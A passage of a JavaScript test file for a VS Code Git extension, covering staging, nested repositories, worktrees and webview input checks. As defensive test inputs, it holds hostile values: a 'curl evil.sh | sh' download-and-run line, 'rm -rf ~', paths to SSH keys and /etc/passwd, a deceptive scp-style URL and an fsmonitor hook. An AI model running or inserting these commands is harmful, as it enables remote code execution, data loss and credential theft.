  const text = ['worktree /tmp/main', 'HEAD ' + 'a'.repeat(40), 'branch refs/heads/main', '', 'worktree /tmp/wt\nnl', 'HEAD ' + 'b'.repeat(40), 'detached', '', ''].join('\0');
  assert.deepEqual(P.parseWorktrees(text, true).map((w) => w.path), ['/tmp/main', '/tmp/wt\nnl']);
});

test('a superseded refresh still hands its caller what it just read', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  r.write('a.txt', '2\n');
  const [first, second] = await Promise.all([repo.refreshState(), repo.refreshState()]);
  assert.equal(first.unstaged.length, 1);
  assert.equal(second.unstaged.length, 1);
  repo.dispose();
});

test('files that never stop changing still get a refresh every few seconds', () => {
  const { refreshDelay } = requireWithVscode('../src/vscode/model');
  // A change every 150 ms for 4 s: the debounce alone would never fire.
  let fired = 0;
  let due = Infinity;
  let pendingSince = 0;
  for (let now = 0; now <= 4000; now += 150) {
    if (now >= due) {
      fired++;
      pendingSince = 0;
      due = Infinity;
    }
    if (!pendingSince) pendingSince = now;
    due = now + refreshDelay(now, pendingSince, 100);
  }
  assert.ok(fired >= 1, `refreshed ${fired} times while files kept changing`);
  assert.equal(refreshDelay(1000, 1000, 100), 300, 'a single change: the usual short debounce');
});

test('continuing a cherry-pick or rebase keeps a typed message that starts with "#"', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  r.git('checkout', '-q', '-b', 'side');
  r.commit('side change', { 'a.txt': 'side\n' });
  const side = r.git('rev-parse', 'HEAD');
  r.git('checkout', '-q', 'main');
  r.commit('main change', { 'a.txt': 'main\n' });
  // A conflicting cherry-pick, resolved, continued with a message the user typed.
  try {
    execFileSync('git', ['cherry-pick', side], { cwd: r.dir, stdio: 'ignore' });
  } catch { /* conflict expected */ }
  r.write('a.txt', 'resolved\n');
  r.git('add', 'a.txt');
  const message = '#123 fix things\n\nbody';
  await repo.writePendingMessage(message);
  await repo.continueOperation('cherry-pick', { message });
  assert.equal(r.git('log', '-1', '--format=%s'), '#123 fix things');
  assert.equal(r.git('log', '-1', '--format=%b').trim(), 'body');
  repo.dispose();
});

test('fetched pull requests of remote "up" are not mixed with those of "up/stream"', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const sha = r.git('rev-parse', 'HEAD');
  r.git('remote', 'add', 'up', r.dir);
  // (git >= 2.4x refuses "remote add" for a name under an existing one; such remotes still come
  // from older clones or the config itself.)
  r.git('config', 'remote.up/stream.url', r.dir);
  r.git('config', 'remote.up/stream.fetch', '+refs/heads/*:refs/remotes/up/stream/*');
  r.git('update-ref', 'refs/commit-corner/pr/up/1/head', sha);
  r.git('update-ref', 'refs/commit-corner/pr/up/stream/5/head', sha);
  assert.deepEqual([...(await repo.getFetchedPullRequests('up')).keys()], [1]);
  assert.deepEqual([...(await repo.getFetchedPullRequests('up/stream')).keys()], [5]);
  repo.dispose();
});

test('scp-style remotes are read the way git reads them', () => {
  const { githubWebUrl } = require('../src/git/remoteUrl');
  assert.equal(githubWebUrl('git@github.com:o/r.git'), 'https://github.com/o/r');
  assert.equal(githubWebUrl('evil.example:x@github.com:o/r'), undefined, 'git connects to evil.example');
});

test('git never inherits variables that point it at another repository', async (t) => {
  const { r } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const other = createRepo();
  t.after(() => other.cleanup());
  other.commit('other', { 'b.txt': '2\n' });
  const saved = process.env.GIT_DIR;
  process.env.GIT_DIR = path.join(other.dir, '.git');
  t.after(() => (saved === undefined ? delete process.env.GIT_DIR : (process.env.GIT_DIR = saved)));
  const { git: run } = require('../src/git/exec');
  const { stdout } = await run(['log', '-1', '--format=%s'], { cwd: r.dir });
  assert.equal(stdout.trim(), 'base');
});

test('a committed symlink to another repository never makes git run there', { skip: process.platform === 'win32' }, async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const elsewhere = createRepo();
  t.after(() => elsewhere.cleanup());
  elsewhere.commit('other', { 'b.txt': '2\n' });
  const marker = path.join(elsewhere.dir, 'RAN');
  execFileSync('git', ['config', 'core.fsmonitor', `touch '${marker}'; false`], { cwd: elsewhere.dir });
  fs.symlinkSync(elsewhere.dir, path.join(r.dir, 'lnk'));
  r.git('add', 'lnk');
  r.git('commit', '-q', '-m', 'link');
  const { WORKTREE } = require('../src/git/repository');
  assert.equal(await repo.isOwnSubmodule(path.join(r.dir, 'lnk')), false);
  // Shown as git stores it (the link's text), never followed.
  assert.equal(String(await repo.show(WORKTREE, 'lnk')), elsewhere.dir);
  // An embedded repository that is not a recorded submodule is not run git in either.
  const embedded = createRepo();
  t.after(() => embedded.cleanup());
  fs.renameSync(embedded.dir, path.join(r.dir, 'vendor'));
  embedded.dir = path.join(r.dir, 'vendor');
  assert.equal(await repo.isOwnSubmodule(path.join(r.dir, 'vendor')), false);
  assert.equal(fs.existsSync(marker), false);
  repo.dispose();
});

test('a real submodule is still recognised (and diffed as "Subproject commit")', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const lib = createRepo();
  t.after(() => lib.cleanup());
  lib.commit('lib', { 'lib.txt': 'l\n' });
  r.git('-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', lib.dir, 'lib');
  assert.equal(await repo.isOwnSubmodule(path.join(r.dir, 'lib')), true);
  const { WORKTREE } = require('../src/git/repository');
  assert.match(String(await repo.show(WORKTREE, 'lib')), /^Subproject commit [0-9a-f]{40}/);
  repo.dispose();
});

test('graph pages cannot name revisions, paths or clipboard text freely', async () => {
  const { GraphPanel } = requireWithVscode('../src/vscode/webviews/graphPanel');
  const calls = [];
  const fake = { repo: { root: '/repo', absolute: (p) => `/repo/${p}` }, cachedFile: (sha, p) => ({ path: p }) };
  const vscode = requireWithVscode('vscode');
  const saved = vscode.commands.executeCommand;
  vscode.commands.executeCommand = async (...a) => calls.push(a);
  try {
    for (const file of [{ path: '../../.ssh/id_ed25519' }, { path: '/etc/passwd' }, { path: 'a.txt', beforeRef: '~worktree~' }, { path: 'a.txt', group: 'evil' }]) {
      await GraphPanel.prototype.openFile.call(fake, { kind: 'worktree', file: file });
      await GraphPanel.prototype.openFile.call(fake, { kind: 'commit', file, sha: 'a'.repeat(40), parent: ':/text' });
    }
    assert.deepEqual(calls, []);
    // A valid file of the working tree opens (exactly once): the checks above are not just "nothing works".
    await GraphPanel.prototype.openFile.call(fake, { kind: 'worktree', file: { path: 'src/a.txt', group: 'unstaged', status: 'M' } });
    assert.equal(calls.length, 1);
    assert.equal(calls[0][0], 'commitCorner.openResource');
    // The clipboard takes commit SHAs only, never other text (a shell command).
    calls.length = 0;
    const clip = [];
    const savedClip = vscode.env.clipboard;
    vscode.env.clipboard = { writeText: async (t) => clip.push(t) };
    try {
      const page = { repo: fake.repo, post() {} };
      const onMessage = (m) => GraphPanel.prototype.onMessage.call(page, m);
      await onMessage({ type: 'copy', text: 'curl evil.sh | sh' });
      await onMessage({ type: 'copy', text: `${'a'.repeat(40)}\nrm -rf ~` });
      assert.deepEqual(clip, []);
      await onMessage({ type: 'copy', text: 'b'.repeat(40) });
      assert.deepEqual(clip, ['b'.repeat(40)]);
    } finally {
      vscode.env.clipboard = savedClip;
    }
  } finally {
    vscode.commands.executeCommand = saved;
  }
});

test('staging from the graph acts only on files listed in their group', async () => {
  const { GraphPanel } = requireWithVscode('../src/vscode/webviews/graphPanel');
  const calls = [];
  const posted = [];
  const state = {
    head: { sha: 'a'.repeat(40) },
    conflicts: [],
    staged: [{ path: 'done.txt', x: 'M' }],
    unstaged: [{ path: 'src/a.js', y: 'M' }],
    untracked: [{ path: 'new.txt', y: '?' }],
  };
  const fake = {
    repo: { root: '/repo', refreshState: async () => state, revParse: async () => 'b'.repeat(40) },
    post: (m) => posted.push(m),
    sendFiles: async () => {},
    runWorktreeAction: GraphPanel.prototype.runWorktreeAction,
  };
  const vscode = requireWithVscode('vscode');
  const saved = vscode.commands.executeCommand;
  vscode.commands.executeCommand = async (id, arg) => calls.push([id, Array.isArray(arg) ? arg.map((a) => a.path).join(',') : arg && (arg.path || arg.id || arg.message || '')]);
  const act = (m) => GraphPanel.prototype.worktreeAction.call(fake, { repoRoot: '/repo', ...m });
  try {
    // Meant for another repository (the page still showed it): nothing runs.
    await act({ action: 'stage', group: 'unstaged', path: 'src/a.js', repoRoot: '/other' });
    await act({ action: 'commit', message: 'x', repoRoot: undefined });
    // Not listed, wrong group, or no such action: nothing runs.
    await act({ action: 'stage', group: 'unstaged', path: '../../.ssh/id_ed25519' });
    await act({ action: 'stage', group: 'staged', path: 'done.txt' });
    await act({ action: 'unstage', group: 'unstaged', path: 'src/a.js' });
    await act({ action: 'discard', group: 'staged', path: 'done.txt' });
    await act({ action: 'discard', group: 'evil', path: 'src/a.js' });
    await act({ action: 'stageGroup', group: 'staged' });
    await act({ action: 'discardGroup', group: 'staged' });
    await act({ action: 'runShell', group: 'unstaged', path: 'src/a.js' });
    await act({ action: 'stage', group: 'unstaged', folder: 'sr' }); // a folder is a whole name
    await act({ action: 'stage', group: 'unstaged', folder: '..' });
    assert.deepEqual(calls, []);
    // Listed files: the matching command, with the path from git's own list.
    await act({ action: 'stage', group: 'unstaged', path: 'src/a.js' });
    await act({ action: 'stage', group: 'unstaged', folder: 'src' }); // a folder: its files in that group
    await act({ action: 'unstage', group: 'staged', path: 'done.txt' });
    await act({ action: 'discard', group: 'untracked', path: 'new.txt' });
    await act({ action: 'stageGroup', group: 'untracked' });
    await act({ action: 'discardGroup', group: 'untracked' });
    await act({ action: 'commit', message: '--amend' });
    assert.deepEqual(calls, [
      ['commitCorner.stage', 'src/a.js'],
      ['commitCorner.stage', 'src/a.js'],
      ['commitCorner.unstage', 'done.txt'],
      ['commitCorner.discard', 'new.txt'],
      ['commitCorner.stageAll', 'untracked'],
      ['commitCorner.cleanAll', ''],
      ['commitCorner.commit', '--amend'], // the message is the message, never an option
    ]);
    assert.ok(posted.some((m) => m.type === 'wtCommitted'), 'HEAD moved: the message box is cleared');
    // While one action runs, another (a second Enter) is ignored.
    calls.length = 0;
    let release;
    vscode.commands.executeCommand = (id, arg) => new Promise((res) => { calls.push([id, arg.message]); release = res; });
    const first = act({ action: 'commit', message: 'one' });
    await new Promise((r) => setImmediate(r));
    await act({ action: 'commit', message: 'one' });
    release();
    await first;
    assert.deepEqual(calls, [['commitCorner.commit', 'one']]);
  } finally {
    vscode.commands.executeCommand = saved;
  }
});

test('files of a worktree nested in the repository are not the outer repository\'s', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'src/a.js': '1\n' });
  r.git('worktree', 'add', '-q', '-b', 'agent', path.join(r.dir, '.wt', 'agent'));
  const nestedFile = path.join(r.dir, '.wt', 'agent', 'src', 'a.js');
  fs.writeFileSync(nestedFile, '2\n');
  assert.equal(repo.contains(nestedFile), false);
  assert.equal(repo.contains(path.join(r.dir, 'src', 'a.js')), true);
  await assert.rejects(repo.writeIndexContent('.wt/agent/src/a.js', Buffer.from('2\n')), /nested/);
  assert.doesNotMatch(r.git('status', '--porcelain'), /^A /m, 'nothing staged in the outer repository');
  repo.dispose();
});

test('a refresh while an interactive rebase starts does not delete its plan', { skip: process.platform === 'win32' }, async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  r.commit('two', { 'a.txt': '2\n' });
  r.commit('three', { 'a.txt': '3\n' });
  const hook = path.join(r.dir, '.git', 'hooks', 'pre-rebase');
  fs.writeFileSync(hook, '#!/bin/sh\nsleep 1\n');
  fs.chmodSync(hook, 0o755);
  const [two, three] = [r.git('rev-parse', 'HEAD~1'), r.git('rev-parse', 'HEAD')];
  const base = r.git('rev-parse', 'HEAD~2');
  const rebase = repo.rebaseInteractive(base, [
    { type: 'commit', action: 'pick', sha: two, subject: 'two' },
    { type: 'commit', action: 'squash', sha: three, subject: 'three' },
  ]);
  await new Promise((res) => setTimeout(res, 300));
  await repo.refreshState(); // what a file watcher would do meanwhile
  await rebase;
  assert.equal(r.git('rev-list', '--count', 'HEAD'), '2', 'two and three squashed');
  repo.dispose();
});

test('the prepared message keeps a subject that starts with "#" (git\'s comment block is cut)', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  fs.writeFileSync(path.join(r.dir, '.git', 'MERGE_MSG'), '#123 fix crash\n\nbody line\n\n# Conflicts:\n#\ta.txt\n');
  assert.equal(await repo.getPendingMessage(), '#123 fix crash\n\nbody line');
  fs.writeFileSync(path.join(r.dir, '.git', 'MERGE_MSG'), "Merge branch 'x'\n\n# Conflicts:\n#\ta.txt\n");
  assert.equal(await repo.getPendingMessage(), "Merge branch 'x'");
  repo.dispose();
});

test('a branch knows which branch it was created from', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  r.git('branch', 'dev');
  r.git('branch', 'agent', 'dev');
  assert.equal(await repo.createdFrom('agent'), 'dev');
  r.git('branch', 'other');
  assert.equal(await repo.createdFrom('other'), 'main', 'git names the branch HEAD was on');
  r.git('branch', 'pinned', r.git('rev-parse', 'HEAD'));
  assert.equal(await repo.createdFrom('pinned'), undefined, 'created from a bare SHA: unknown');
  r.commit('second', { 'a.txt': '2\n' });
  r.git('branch', 'moving', 'HEAD~1');
  r.git('tag', 'v1');
  r.git('branch', 'tagged', 'v1');
  assert.equal(await repo.createdFrom('moving'), undefined, 'an expression (HEAD~1) is no base');
  assert.equal(await repo.createdFrom('tagged'), undefined, 'a tag is no base');
  repo.dispose();
});

test('git never runs in an old worktree path that now holds another repository', { skip: process.platform === 'win32' }, async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const wt = `${r.dir}-wt`;
  t.after(() => fs.rmSync(wt, { recursive: true, force: true }));
  r.git('worktree', 'add', '-q', '-b', 'w', wt);
  fs.rmSync(wt, { recursive: true, force: true }); // deleted by hand, not pruned
  execFileSync('git', ['init', '-q', wt]);
  const marker = path.join(wt, 'RAN');
  execFileSync('git', ['config', 'core.fsmonitor', `touch '${marker}'; false`], { cwd: wt });
  assert.equal(await repo.ownsWorktree(wt), false);
  await repo.getWorktreeDetails();
  await assert.rejects(repo.worktreeChangesSince(wt, 'main'), /not a worktree/);
  assert.equal(fs.existsSync(marker), false);
  repo.dispose();
});

test('a repository nested in the working tree is never staged or listed for deletion as a file', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  r.git('worktree', 'add', '-q', '-b', 'agent', path.join(r.dir, '.wt', 'agent'));
  r.write('new.txt', 'n\n');
  const s = await repo.refreshState();
  assert.deepEqual(repo.nestedRepositories(s), ['.wt/agent/']);
  await repo.stageAll();
  const staged = r.git('diff', '--cached', '--name-only');
  assert.equal(staged, 'new.txt', 'only the real new file; no gitlink for the worktree');
  repo.dispose();
});

test('a repository deeper inside an untracked folder is nested too, in "normal" untracked mode', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  r.git('worktree', 'add', '-q', '-b', 'agent', path.join(r.dir, '.claude', 'worktrees', 'agent'));
  r.write('.claude/settings.json', '{}\n');
  r.write('other/new.txt', 'n\n');
  repo.untrackedMode = 'normal';
  const s = await repo.refreshState();
  assert.deepEqual(repo.nestedRepositories(s), ['.claude/worktrees/agent/']);
  // The folder holding it is listed file by file; other folders stay collapsed as in "normal".
  assert.deepEqual(s.untracked.map((e) => e.path).sort(), ['.claude/settings.json', 'other/']);
  await repo.stageAll();
  assert.deepEqual(r.git('diff', '--cached', '--name-only').split('\n').sort(), ['.claude/settings.json', 'other/new.txt'], 'no gitlink for the worktree');
  repo.dispose();
});

test('"normal" untracked mode: a big untracked folder stays one row unless a repository is inside it', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  fs.mkdirSync(path.join(r.dir, 'dump'));
  for (let k = 0; k < 5200; k++) fs.writeFileSync(path.join(r.dir, 'dump', `f${k}.txt`), '');
  repo.untrackedMode = 'normal';
  let s = await repo.refreshState();
  assert.deepEqual(s.untracked.map((e) => e.path), ['dump/'], 'too big to look through, and git finds no repository in it');
  fs.mkdirSync(path.join(r.dir, 'dump', 'zz'));
  r.git('worktree', 'add', '-q', '-b', 'deep', path.join(r.dir, 'dump', 'zz', 'agent'));
  s = await repo.refreshState();
  assert.deepEqual(repo.nestedRepositories(s), ['dump/zz/agent/']);
  assert.equal(s.untracked.length, 5200, 'listed file by file, the worktree left out');
  repo.dispose();
});

test('worktree polls share one status per worktree for a few seconds', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  for (let k = 0; k < 4; k++) r.git('worktree', 'add', '-q', '-b', `agent${k}`, path.join(r.dir, '.wt', `a${k}`));
  await repo.refreshState();
  const exec = require('../src/git/exec');
  let count = 0;
  exec.configure({ logger: () => count++ });
  t.after(() => exec.configure({ logger: () => {} }));
  const first = await repo.getWorktreeDetails();
  const firstCount = count;
  count = 0;
  const second = await repo.getWorktreeDetails();
  assert.deepEqual(second.map((w) => w.changes), first.map((w) => w.changes));
  assert.ok(count <= 2, `second poll: ${count} git processes (first: ${firstCount}): only the worktree list and their commits`);
  repo.dispose();
});

test('a SHA-256 repository: the first commit\'s files, a combined diff over it, untracked stash files', async (t) => {
  const dir = makeTempDir('cc-sha256-');
  const g = (...a) => execFileSync('git', a, { cwd: dir, encoding: 'utf8', env: { ...process.env, GIT_AUTHOR_NAME: 'T', GIT_AUTHOR_EMAIL: 't@x', GIT_COMMITTER_NAME: 'T', GIT_COMMITTER_EMAIL: 't@x' } }).trim();
  g('init', '-q', '--object-format=sha256', '-b', 'main');
  fs.writeFileSync(path.join(dir, 'a.txt'), '1\n');
  g('add', '-A');
  g('commit', '-q', '-m', 'first');
  fs.writeFileSync(path.join(dir, 'a.txt'), '2\n');
  g('commit', '-q', '-am', 'second');
  const repo = await Repository.open(dir);
  // The repository's git processes stop before its folder goes (Windows: a folder in use stays).
  t.after(() => {
    repo.dispose();
    return fs.promises.rm(dir, { recursive: true, force: true, maxRetries: 20, retryDelay: 100 });
  });
  assert.equal(repo.objectFormat, 'sha256');
  const root = g('rev-list', '--max-parents=0', 'HEAD');
  assert.equal(root.length, 64);
  const { files } = await repo.getCommitFiles(root);
  assert.deepEqual(files.map((f) => f.path), ['a.txt']);
  const { EMPTY_TREE } = require('../src/git/repository');
  assert.equal(await repo.show(EMPTY_TREE, 'a.txt'), null, 'the views\' empty tree means this repository\'s (no "bad revision")');
  assert.match(await repo.patchText(EMPTY_TREE, 'HEAD'), /\+2/);
});

test('a repository created deeper in an untracked folder right after a refresh is never staged', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  fs.mkdirSync(path.join(r.dir, '.claude', 'worktrees'), { recursive: true });
  fs.writeFileSync(path.join(r.dir, '.claude', 'settings.json'), '{}\n');
  repo.untrackedMode = 'normal';
  await repo.refreshState(); // ".claude/" holds no repository yet
  r.git('worktree', 'add', '-q', '-b', 'agent1', path.join(r.dir, '.claude', 'worktrees', 'agent1'));
  const s = await repo.refreshState(); // moments later
  assert.deepEqual(repo.nestedRepositories(s), ['.claude/worktrees/agent1/']);
  await repo.stageAll();
  assert.doesNotMatch(r.git('ls-files', '-s'), /^160000/m, 'no gitlink for the new worktree');
  repo.dispose();
});

test('commit --only with more paths than a command line holds (they go through a file)', async (t) => {
  const { r, repo } = await setup(t);
  const files = {};
  for (let k = 0; k < 300; k++) files[`deep/folder/structure/that/is/long/file-${k}.txt`] = '1\n';
  r.commit('base', { ...files, 'other.txt': 'o\n' });
  for (let k = 0; k < 300; k++) r.write(`deep/folder/structure/that/is/long/file-${k}.txt`, '2\n');
  r.write('other.txt', 'staged\n');
  r.git('add', 'other.txt');
  await repo.commit('only these', { only: Object.keys(files) });
  assert.equal(r.git('show', '--name-only', '--format=', 'HEAD').split('\n').length, 300);
  assert.equal(r.git('diff', '--cached', '--name-only'), 'other.txt', 'the other staged change stays staged');
  repo.dispose();
});

test('staging a folder looks for a repository created in it since the last status', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  fs.mkdirSync(path.join(r.dir, 'work'));
  fs.writeFileSync(path.join(r.dir, 'work', 'notes.txt'), 'n\n');
  repo.untrackedMode = 'normal';
  const s = await repo.refreshState(); // "work/" holds no repository yet
  assert.deepEqual(s.untracked.map((e) => e.path), ['work/']);
  r.git('worktree', 'add', '-q', '-b', 'wt', path.join(r.dir, 'work', 'wt'));
  await repo.stage(s.untracked.map((e) => e.path)); // the status is a moment old
  assert.doesNotMatch(r.git('ls-files', '-s'), /^160000/m, 'no gitlink for the new worktree');
  assert.match(r.git('diff', '--cached', '--name-only'), /work\/notes\.txt/);
  repo.dispose();
});

test('staging a submodule stages its new commit (a repository, but one git knows)', async (t) => {
  const { r, repo } = await setup(t);
  const sub = createRepo();
  t.after(() => fs.rmSync(sub.dir, { recursive: true, force: true }));
  sub.commit('sub base', { 's.txt': '1\n' });
  r.commit('base', { 'a.txt': '1\n' });
  r.git('-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', sub.dir, 'lib');
  r.git('commit', '-q', '-m', 'add lib');
  const lib = path.join(r.dir, 'lib');
  fs.writeFileSync(path.join(lib, 's.txt'), '2\n');
  execFileSync('git', ['-C', lib, '-c', 'user.name=t', '-c', 'user.email=t@e', 'commit', '-qam', 'sub change']);
  await repo.refreshState();
  await repo.stage(['lib']);
  assert.match(r.git('diff', '--cached', '--name-only'), /^lib$/m, 'the submodule\'s new commit is staged');
  repo.dispose();
});

test('a combined diff is approximate only for the files that need unselected commits', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'f.txt': '1\n', 'h.txt': 'h\n' });
  const s1 = r.commit('s1', { 'g.txt': 'g\n' });
  r.commit('unselected', { 'f.txt': '2\n' });
  const s3 = r.commit('s3 builds on it, and edits h', { 'f.txt': '3\n', 'h.txt': 'h2\n' });
  const res = await repo.getMultiCommitChanges([s1, s3]);
  assert.equal(res.exact, false);
  assert.deepEqual(res.failed, [s3]);
  assert.deepEqual(res.approximate, ['f.txt']);
  const byPath = new Map(res.files.map((f) => [f.path, f]));
  assert.equal(byPath.get('f.txt').approximate, true);
  assert.ok(!byPath.get('h.txt').approximate && byPath.get('h.txt').afterRef === res.tree, 'h.txt is exact (from the replayed tree)');
  assert.equal(String(await repo.show(res.tree, 'h.txt')), 'h2\n');
  assert.ok(!byPath.get('g.txt').approximate);
});

/** A repository with `a.txt` committed, and its Repository. */
async function based(t) {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  t.after(() => repo.dispose());
  return { r, repo };
}

/** What `promise` rejects with (fails the test when it resolves). */
async function rejection(promise) {
  try {
    await promise;
  } catch (e) {
    return e;
  }
  throw new Error('expected a rejection');
}

test('a file git leaves out (inside a repository nested after the status listed it) is reported; the others are staged', async (t) => {
  const { r, repo } = await based(t);
  // An agent's copy: its files are listed one by one before its .git arrives.
  r.write('.local-work/c1/a.txt', '1\n');
  r.write('.local-work/c1/new.txt', 'n\n');
  r.write('mine.txt', 'm\n');
  const s = await repo.refreshState();
  assert.deepEqual(s.untracked.map((e) => e.path).sort(), ['.local-work/c1/a.txt', '.local-work/c1/new.txt', 'mine.txt']);
  r.git('init', '-q', path.join(r.dir, '.local-work', 'c1'));
  // git itself exits 0 and stages nothing here: Commit Corner must not pass that on silently.
  const err = await rejection(repo.stage(['.local-work/c1/new.txt', 'mine.txt']));
  assert.equal(err.code, 'NotStaged');
  assert.deepEqual(err.paths, ['.local-work/c1/new.txt']);
  assert.deepEqual(err.nested, ['.local-work/c1/']);
  assert.equal(err.message, '".local-work/c1/new.txt" was not staged: it is in ".local-work/c1/", a separate Git repository inside this one, and git skips its files without a word. Stage it in that repository.');
  assert.equal(r.git('diff', '--cached', '--name-only'), 'mine.txt', 'the other file is staged');
  assert.doesNotMatch(r.git('ls-files', '-s'), /^160000/m, 'no gitlink either');
  // Staging a modified tracked file or a deletion is never reported.
  r.write('a.txt', '2\n');
  r.write('gone.txt', 'g\n');
  r.git('add', 'gone.txt');
  r.rm('gone.txt');
  await repo.stage(['a.txt', 'gone.txt']);
  assert.deepEqual(r.git('diff', '--cached', '--name-only').split('\n').sort(), ['a.txt', 'mine.txt']);
});

test('more files than a command line holds: the one inside a nested copy is reported, the rest staged', async (t) => {
  const { r, repo } = await based(t);
  for (let k = 0; k < 300; k++) r.write(`many/f${k}.txt`, `${k}\n`);
  r.write('.local-work/c1/x.txt', 'x\n');
  await repo.refreshState();
  r.git('init', '-q', path.join(r.dir, '.local-work', 'c1'));
  const err = await rejection(repo.stage([...Array.from({ length: 300 }, (_, k) => `many/f${k}.txt`), '.local-work/c1/x.txt']));
  assert.deepEqual(err.paths, ['.local-work/c1/x.txt']);
  assert.equal(r.git('diff', '--cached', '--name-only').split('\n').length, 300);
});

test('"normal" untracked mode: a folder row that is, or only holds, a repository of its own is reported, not silently skipped', async (t) => {
  const { r, repo } = await based(t);
  repo.untrackedMode = 'normal';
  r.write('.local-work/c1/new.txt', 'n\n');
  r.write('copy/new.txt', 'n\n');
  const s = await repo.refreshState();
  assert.deepEqual(s.untracked.map((e) => e.path).sort(), ['.local-work/', 'copy/']);
  r.git('init', '-q', path.join(r.dir, '.local-work', 'c1'));
  r.git('init', '-q', path.join(r.dir, 'copy'));
  let err = await rejection(repo.stage(['.local-work/']));
  assert.deepEqual(err.nested, ['.local-work/c1/']);
  assert.match(err.message, /^"\.local-work\/" was not staged: it holds only "\.local-work\/c1\/", a separate Git repository/);
  err = await rejection(repo.stage(['copy/']));
  assert.deepEqual(err.nested, ['copy/']);
  assert.match(err.message, /^"copy\/" was not staged: it is a separate Git repository inside this one/);
  assert.equal(r.git('diff', '--cached', '--name-only'), '');
  assert.doesNotMatch(r.git('ls-files', '-s'), /^160000/m);
});

test('several nested repositories, or files git skipped for no known reason, are each named', async (t) => {
  const { repo } = await based(t);
  const nested = (p) => ({ path: p, nested: `${p.split('/')[0]}/` });
  let err = await rejection(repo.checkStaged([], [nested('a/x'), nested('b/y'), nested('b/z')]));
  assert.equal(err.message, '3 files were not staged: they are in "a/" and "b/", separate Git repositories inside this one, and git skips their files without a word. Stage them in those repositories.');
  assert.deepEqual(err.nested, ['a/', 'b/']);
  err = await rejection(repo.checkStaged([], [nested('a/x'), nested('b/y'), nested('c/y'), nested('d/y')]));
  assert.match(err.message, /they are in "a\/", "b\/", "c\/" and 1 more, separate Git repositories/);
  // A file not in the index after git add, though in no nested repository (the check itself).
  writeIn(repo, 'plain.txt');
  err = await rejection(repo.checkStaged(['plain.txt']));
  assert.equal(err.message, '"plain.txt" was not staged: git left it out without saying why.');
});

/** Write a file into `repo`'s working tree. */
function writeIn(repo, rel) {
  fs.writeFileSync(path.join(repo.root, rel), 'x\n');
}

test('a .git that does not make a repository (empty, or a link to a removed worktree) is no boundary: git stages those files', async (t) => {
  const { r, repo } = await based(t);
  r.write('empty/s/a.txt', 'a\n');
  fs.mkdirSync(path.join(r.dir, 'empty', '.git'));
  r.write('broken/s/a.txt', 'a\n');
  r.write('broken/.git', 'gitdir: /nonexistent/worktrees/x\n');
  await repo.refreshState();
  assert.equal(repo.nestedRepositoryOf('empty/s/a.txt'), undefined);
  assert.equal(repo.nestedRepositoryOf('broken/s/a.txt'), undefined);
  await repo.stage(['empty/s/a.txt', 'broken/s/a.txt']);
  assert.deepEqual(r.git('diff', '--cached', '--name-only').split('\n').sort(), ['broken/s/a.txt', 'empty/s/a.txt']);
  // A linked worktree's .git file names a real folder: a boundary.
  r.git('worktree', 'add', '-q', '-b', 'wt', path.join(r.dir, '.wt', 'one'));
  assert.equal(repo.nestedRepositoryOf('.wt/one/a.txt'), '.wt/one/');
});

test('case-insensitive setups: a new file filed under the index\'s folder casing counts as staged', async (t) => {
  const { r, repo } = await based(t);
  r.git('config', 'core.ignorecase', 'true');
  r.write('Src/a.js', 'a\n');
  r.git('add', 'Src/a.js');
  r.git('commit', '-q', '-m', 'Src');
  // The folder renamed by case only on disk (Windows, macOS); a new file in it.
  fs.renameSync(path.join(r.dir, 'Src'), path.join(r.dir, 'src'));
  r.write('src/new.js', 'n\n');
  await repo.stage(['src/new.js']);
  assert.match(r.git('diff', '--cached', '--name-only'), /^(Src|src)\/new\.js$/i);
});

test('a write waits for a lock another git process releases within seconds, gives up after the wait, and says when a lock is stale', async (t) => {
  const { r, repo } = await based(t);
  const lock = path.join(r.dir, '.git', 'index.lock');
  t.after(() => fs.rmSync(lock, { force: true }));
  // An agent's commit keeps the lock while its hooks run: released after 1.5 seconds.
  r.write('b.txt', 'b\n');
  fs.writeFileSync(lock, '');
  let released = false;
  const timer = setTimeout(() => {
    released = true;
    fs.rmSync(lock, { force: true });
  }, 1500);
  let started = Date.now();
  await repo.stage(['b.txt']);
  const waited = Date.now() - started;
  clearTimeout(timer);
  assert.ok(released, `staged only once the lock was released (after ${waited} ms; lock there now: ${fs.existsSync(lock)})`);
  assert.equal(r.git('diff', '--cached', '--name-only'), 'b.txt');
  // Never released: fails with IndexLocked once the wait is over (shortened here).
  repo.lockWaitMs = 800;
  fs.writeFileSync(lock, '');
  r.write('c.txt', 'c\n');
  started = Date.now();
  let err = await rejection(repo.stage(['c.txt']));
  assert.equal(err.code, 'IndexLocked');
  // (Upper bounds here are loose — a loaded machine starts git slowly — but far below the 30 s
  // or forever a broken wait would take.)
  assert.ok(Date.now() - started >= 700 && Date.now() - started < 20000, `gave up after ${Date.now() - started} ms`);
  // Cancelled while waiting (the status bar's item): stops at once.
  repo.lockWaitMs = 30000;
  const stage = repo.stage(['c.txt']);
